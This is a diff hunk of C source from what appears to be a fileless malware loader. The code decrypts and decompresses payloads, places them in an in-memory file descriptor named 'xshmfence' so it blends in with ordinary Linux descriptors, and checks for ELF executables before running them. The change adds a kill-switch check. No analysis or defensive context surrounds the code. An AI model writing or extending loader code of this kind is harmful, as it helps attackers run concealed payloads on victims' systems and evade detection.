@@ -67,6 +67,11 @@ int main(int argc, char **argv)
 
         decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[i].uncompressedLength, (uLong)payloadMeta[i].decryptedLength);
 
+        if ((payloadMeta[i].uncompressedLength == 64) && (checkKill(decompressed) == 1))
+        {
+            return -1;
+        }
+
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         {                                                       // create memory file descriptor for execution
             close(payloadFD);
@@ -84,7 +89,7 @@ int main(int argc, char **argv)
             free(formattedURL);
             return -1;
         }
-
+        
         d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF
 
         if (d == 1)
